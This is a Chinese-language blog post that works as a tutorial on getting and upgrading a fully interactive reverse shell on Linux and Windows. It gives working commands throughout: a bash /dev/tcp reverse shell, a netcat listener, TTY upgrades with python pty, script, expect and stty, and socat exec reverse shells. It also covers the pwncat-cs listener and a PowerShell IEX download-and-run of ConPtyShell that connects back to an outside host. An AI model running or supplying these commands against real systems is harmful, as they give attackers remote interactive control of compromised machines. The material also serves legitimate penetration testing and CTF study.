---
layout: post
title: Get a Fully Interactive Reverse Shell
category: Linux
tags: [reverse shell, tty, pty, socat]
---

## Reverse Shell (semi-interactive shell)

一般反弹 shell 的命令：

```console
[root@centos ~]# /bin/bash -i >& /dev/tcp/192.168.10.11/4444 0>&1
```

接收到半交互式的 shell：

```console
kali@kali:~$  nc -lvnp 4444
Listening on 0.0.0.0 4444
[root@centos ~]# tty
tty
not a tty

[root@centos ~]#
```

当前获取到的 reverse shell 还存在诸多限制，如：无法使用 top 这类命令，ctrl+c 会中断整个 reverse shell 等。

## Upgrade Reverse Shell

TTY 是英文 Teletype 的缩写，译为电传打字机，简称电传。现在通常泛指类 Unix 操作系统中的虚拟控制台。

PTY（Pseudo-TTY，伪终端），由 pts (pseudo-terminal slave) 与 ptmx (pseudo-terminal master) 实现。

### Spawn a TTY shell

在 reverse shell 中，使用 python 的 pty 模块，将当前 non-TTY shell 升级成一个 TTY shell：

```console
[root@centos ~]# tty
tty
not a tty

[root@centos ~]# python -c 'import pty;pty.spawn("/bin/bash")';
python -c 'import pty;pty.spawn("/bin/bash")';
[root@centos ~]# tty
tty
/dev/pts/8
```

> 注：无论 python2 和 python3 都可以使用该命令。

如果目标主机中，没有安装 python 环境。也可以使用 script 命令获取到一个 TTY shell：

```console
[root@centos ~]# /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
[root@centos ~]# tty
tty
/dev/pts/9
```

使用 expect 命令也能获取到 TTY shell，但该命令在大多 Linux 主机上需要额外安装：

```console
[root@centos ~]# expect -c 'spawn bash;interact'
expect -c 'spawn bash;interact'
spawn bash
[root@centos ~]# tty
tty
/dev/pts/11
```

现在已经解决了因为没有 TTY 而导致一些命令不能使用的问题了。

但在使用时，依然存在一些 “问题”，如：会将用户输入的字符串进行回显、不能用 tab 补齐命令、按 ctrl+c 会直接退出 reverse shell 等。

### Upgrade to Full Interactive Shell

先按 ctrl+z 将 reverse shell 发送到后台，设置当前的 shell 通过 reverse shell 来发送控制字符和其他原始输入：

```console
[root@centos ~]# ^Z
[1]+  Stopped                 nc -lvnp 4444
kali@kali:~$ stty size
46 77
kali@kali:~$ stty raw -echo
```

再输入命令 fg，将 reverse shell 返回到前台，接着在目标机器上进行以下设置：

```console
kali@kali:~$ jobs -l
[1]+ 1161146 Stopped                 nc -lvnp 4444
kali@kali:~$ fg 1

[root@centos ~]# export SHELL=bash
[root@centos ~]# export TERM=xterm-256color
[root@centos ~]# stty rows 46 columns 77
[root@centos ~]# reset
```

此时的终端，就和 SSH 连接上的一样了。无论是执行或者中断命令，还是在 vim 中都不会有任何问题了。

## Using socat

使用 socat 可以直接弹回来一个带有 TTY 的完全交互式 shell。

二进制文件下载地址：[https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

---

开启监听：

```console
kali@kali:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444

[root@centos ~]# tty
/dev/pts/10
```

执行 reverse shell 命令：

```console
[root@centos ~]# socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.10.11:4444
```

## Using pwncat-cs

使用 [pwncat-cs](https://github.com/calebstewart/pwncat) 可以自动处理接收到的反弹 shell，尝试生成一个伪终端（pty）以进行完整的交互式会话。

```console
kali@kali:~$ pipx install pwncat-cs
kali@kali:~$ pwncat-cs --download-plugins
kali@kali:~$ pwncat-cs -lp 1234
[13:27:35] Welcome to pwncat 🐈!                                                                    __main__.py:164
bound to 0.0.0.0:1234 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[13:28:35] received connection from xx.xx.xx.xx:51758                                                     bind.py:84
[13:28:36] xx.xx.xx.xx:51758: registered new host w/ db                                               manager.py:957
(local) pwncat$ back
(remote) [root@centos ~]# tty
/dev/pts/6
(remote) [root@centos ~]# Ctrl+D
(local) pwncat$
```

## Using ConPtyShell

如果目标主机是 Windows 操作系统，可以使用 [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) 快速获得一个完全交互式 Shell。

开启监听：

```console
kali@kali:~$ stty raw -echo; (stty size; cat) | nc -lvnp 1234
```

执行 Reverse Shell 命令：

```console
PS C:\> IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.25.68.38 1234

CreatePseudoConsole function found! Spawning a fully interactive shell
```

之后 Kali 上会收到一个完整的 Shell：

```
Windows PowerShell
版权所有（C） Microsoft Corporation。保留所有权利。

安装最新的 PowerShell，了解新功能和改进！https://aka.ms/PSWindows

PS C:\> whoami
...
```

## References

- Unix 终端系统（TTY）是如何工作的 | Shall We Code?  
  [https://waynerv.com/posts/how-tty-system-works/](https://waynerv.com/posts/how-tty-system-works/)
- Upgrade a linux reverse shell to a fully usable TTY shell  
  [https://zweilosec.github.io/posts/upgrade-linux-shell/](https://zweilosec.github.io/posts/upgrade-linux-shell/)
- Full TTYs - HackTricks  
  [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
- How to Get a Fully Interactive Reverse Shell  
  [https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1](https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1)
